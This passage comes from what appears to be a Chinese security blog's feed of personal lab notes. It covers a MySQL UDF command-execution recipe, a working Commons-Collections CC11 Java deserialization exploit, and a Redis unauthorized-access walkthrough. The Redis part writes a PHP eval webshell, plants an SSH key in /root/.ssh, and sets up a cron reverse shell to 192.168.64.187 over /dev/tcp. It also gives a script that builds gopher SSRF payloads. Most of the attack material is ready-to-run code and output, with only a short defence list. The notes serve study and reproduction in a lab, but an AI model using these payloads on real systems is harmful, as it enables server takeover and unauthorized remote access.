<p>如果没有注入，可以在secure_file_priv 无限制的情况下，手工写到插件目录下</p>
<p>借鉴<a class="link"   href="https://www.sqlsec.com/tools/udf.html" >国光师傅的payload<i class="fas fa-external-link-alt"></i></a>，成功写入执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf1.dll&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| name     | ret | dl       | type     |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| sys_eval |   0 | udf1.dll | function |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| sys_eval(&#x27;whoami&#x27;)    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| windows-m9unpkc\admin |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.53 sec)</span><br></pre></td></tr></table></figure>

<p>如果不想要一大串十六进制的东西，可以先加载dll写到一个文件，在dumpfile写进去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table foo (xxx blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;C:\\Users\\admin\\Downloads\\lib_mysqludf_sys_32.dll&#x27;));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\111.dll&quot;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">后面的加载函数同上</span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://www.sqlsec.com/2020/11/mysql.html" >https://www.sqlsec.com/2020/11/mysql.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/" >https://drun1baby.top/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html" >https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>先大概写到这里，虽然不是很难，但是复现真的花了一些时间，有些小细节要注意，用户权限，文件夹宽松权限，secure_file_priv要是空的，这些都要注意！</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>cc11学习笔记</title>
    <url>/2025/02/26/cc11%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>保持学习感觉，趁热打铁学下去🤓</p>
<p>说是CC11比较好用，后续会接触到，既可以加载恶意类，影响版本也比较广，学习！</p>
<h4 id="CC11分析"><a href="#CC11分析" class="headerlink" title="CC11分析"></a>CC11分析</h4><p>这条链子说是CC2+CC6结合，后面利用到恶意类加载，简单回顾一下之前两条链子</p>
<p>之前在学CC3涉及到恶意类加载已经写过了CC6的恶意类加载版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(null);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有一个decorateMap是LazyMap修饰过的</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再套一层TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        decorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改factory的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName,Object fieldValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,fieldValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先比最开始的用多个组合<code>InvokerTransformer</code>成<code>ChainedTransformer</code>的版本，这个版本把<code>templates</code>和一个能调用<code>TemplatesImpl.newTransformer</code>的<code>InvokerTransformer</code>组合成新的<code>ChainedTransformer</code>，后面其他的没有怎么变。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227000944.png"  alt="看图应该好理解一些"></p>
<p>而现在的CC11直接不用<code>Transformer</code>这个类，因为没必要，把有恶意字节码的<code>templates</code>当成key被加载进去就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// ChainedTransformer chainedTransformer = new ChainedTransformer(invokerTransformer);</span></span><br><span class="line">  </span><br><span class="line">  	<span class="comment">// 这部分基本和原来的CC6后部分一致</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decoratedMap,templates); <span class="comment">// 这次传入的“key”是templates</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    expMap.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    decoratedMap.remove(templates);</span><br><span class="line"></span><br><span class="line">    setFieldValue(decoratedMap,<span class="string">&quot;factory&quot;</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">    serialize(expMap);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正着看一下逻辑，这次不把templates包进Transformer，而是直接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decoratedMap,templates);</span><br></pre></td></tr></table></figure>

<p>如果对应看TiedMapEntry这个类的构造函数，会发现</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227002053.png" ></p>
<p>此时在TiedMapEntry里面，map是<code>decoratedMap</code>，我们会控制它是LazyMap，key是 <code>templates</code>我们知道链子会触发getValue()，进入后，也就是LazyMap.get()，之前我们不会在乎括号里的<code>this.key</code>是什么，这次我们把<code>templates</code>传进去，一直跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-02-27%2000.24.15.png" ></p>
<p>此时transformer里面</p>
<blockquote>
<p>Input -&gt; templates</p>
<p>this.iMethodName -&gt; newTransformer</p>
</blockquote>
<p>那这样对应的代码效果就是，反射执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>那就达成我们的目的，恶意类加载，整体思路就是这样，还是很好理解的！</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权漏洞复现</title>
    <url>/2025/02/27/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>继续增加实操经历！</p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379（<strong>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</strong>），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>影响版本  2.x，3.x，4.x，5.x</p>
<p>这边直接在Ubuntu上装了个redis，在<a class="link"   href="http://download.redis.io/releases/" >这个链接<i class="fas fa-external-link-alt"></i></a>下载历史版本的redis，本地编译后修改一下配置文件redis.conf</p>
<p>把这个保护模式从yes改成no，允许别的主机远程连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227135315.png" ></p>
<p>把绑定ip这一行给注释掉，允许除本地外的主机远程登录redis服务</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227135359.png" ></p>
<p>然后开启redis-server，这里我的版本是3.2.7</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227141637.png" ></p>
<p>在kali这边连接，尝试ping，看到pong表示连接成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227141821.png" ></p>
<h4 id="利用未授权写入webshell"><a href="#利用未授权写入webshell" class="headerlink" title="利用未授权写入webshell"></a>利用未授权写入webshell</h4><p><strong>条件</strong></p>
<ul>
<li>服务器的redis存在未授权，攻击机可以直接连接登陆</li>
<li>服务器开了web服务器，攻击者知道web根目录</li>
<li>对web目录有写入权限</li>
</ul>
<p>写入webshell思路是指定本地数据库存放目录设置为&#x2F;var&#x2F;www&#x2F;html，指定本地数据库文件名为shell.php，于是我们就可以写入一个路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php的Webshell文件</p>
<p>原理是我们在数据库中插入一条webshell代码数据，代码作为value，key随便，相当于把缓冲数据保存在shell.php里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/ </span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; <span class="built_in">set</span> xxx <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[&#x27;whoami&#x27;]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227143818.png" ></p>
<p>可以看到是成功的，这里注意有伤害代码要写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure>

<p>多增加了一些换行符，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227144022.png" ></p>
<h4 id="利用未授权写入ssh公钥"><a href="#利用未授权写入ssh公钥" class="headerlink" title="利用未授权写入ssh公钥"></a>利用未授权写入ssh公钥</h4><p>思路也是一样的，这次把数据库默认路径改成&#x2F;root&#x2F;.ssh，缓冲文件名改为authorized.keys</p>
<p>先生成公私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p>在&#x2F;root&#x2F;.ssh下会有id_rsa.pub，读取出来写到目标路径里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkvpZ7bfxoxuHQaCWbss1FfXaz7S30Es0fJtxqDtgV4d166hNSqBlIPDGcqzRfhsrbuCkQCAbWvz89Rh45POAVITVSPnZw8gIdXUsYrWmHFP8NExBc79K+yRh6ja2uFpIELEd1k4gQBfB0fg4G6st042I58Iaj8ZabfH5EgzEG4FOeK35usxk+jioIy/mtl6xwlucWFqQXjF4OAU58O2nmCbd9dtLmV/2ZDXDqAhdRSN0MB+iKfki+c2mq6rlhRpBK/xj6G0GVNlz9GkuYR50Zq2tUO6hKY130f6KW5yHSqezUIb0UpURL4mWYz7qErtNHZrTT5U/isCqp1VYcTDrS67Ax11PoMtzJuvuLtmNruW8pKvTCC9LYVUB+5U49RiHre8duFTkXe9Yx61yT3kmPN4Ocik8tzuTA6srmKIrr7UbLal+PinO/AYgaXDDPTINNgoMwXLbByzj31CSb8eB0TOv6qwQvn3nSlA2VQXnrS/og0jNaB5KPfg/WDNo0o+0= root@Flow\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>记得在写入内容前后都加换行，保证格式正确</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227145153.png" ></p>
<p>然后就登陆上被攻击机的root了</p>
<h4 id="利用未授权写入定时任务"><a href="#利用未授权写入定时任务" class="headerlink" title="利用未授权写入定时任务"></a>利用未授权写入定时任务</h4><p><strong>条件</strong></p>
<p>除了前面所要求的，这次还多要求</p>
<ul>
<li>redis是root用户运行的</li>
<li>机器有定时任务功能（Linux机器大多数会有）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.64.187/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>尝试了半天，写入语句后查看&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root，也没看到反弹shell的命令，原来这个在Ubuntu上行不通，原因是：</p>
<blockquote>
<p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是-rw——-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p>
<p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
<p><strong>由于系统的不同，crontrab定时文件位置也会不同：</strong></p>
<p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></p>
<p>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;﻿</code></p>
</blockquote>
<h4 id="ssrf-redis写入webshell"><a href="#ssrf-redis写入webshell" class="headerlink" title="ssrf+redis写入webshell"></a>ssrf+redis写入webshell</h4><p><strong>利用条件</strong></p>
<ul>
<li>首先有一个ssrf漏洞</li>
<li>redis没有设置密码认证</li>
<li>知道网站根目录，有写入权限</li>
</ul>
<p>主要用到gopher协议，用到的命令和之前是一样的，要用一个脚本（网上找的）生成gopher协议后面的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.64.189&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span>  <span class="comment"># 此处也可以填入 Redis 的密码，在未授权的情况下适用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis 命令列表</span></span><br><span class="line">cmd = [</span><br><span class="line">    <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">    <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">    <span class="string">&quot;save&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果有密码，则在命令中插入 AUTH 命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 gopher URL</span></span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis 命令格式化函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))  <span class="comment"># 使用正确的 urllib.parse.quote</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出最终构造的 payload</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>生成payload解码看到的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227163515.png" ></p>
<p>再编一次码，然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ssrf.php?url=gopher%3A%2F%2F192%2E168%2E64%2E189%3A6379%2F%5F%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524%5FPOST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell%2Ephp%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A&#x27;</span><br></pre></td></tr></table></figure>

<p>这样就能实现和之前一样的效果，当redis不对外开放时就可以考虑利用ssrf，这算是增加了攻击面，但是也要网站本身支持这些协议</p>
<h4 id="常见防护设施"><a href="#常见防护设施" class="headerlink" title="常见防护设施"></a>常见防护设施</h4><p>很容易想</p>
<p>开启防护模式，设置密码安全认证，不对外开放，修改端口为不常见的，给文件夹设置严格的访问权限</p>
<p>先这样，后面再补充一下主从复制的内容</p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsBeanUtils链学习笔记</title>
    <url>/2025/02/27/CommonsBeanUtils%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>keep going🏃‍♀️，有了前面的基础，这个应该不是很难，但是要学习新的java知识</p>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li><p>jdk8u65</p>
</li>
<li><p>commons-beanutils 1.9.2</p>
</li>
</ul>
<p>参考<a class="link"   href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" >Drunkbaby师傅<i class="fas fa-external-link-alt"></i></a>给的环境</p>
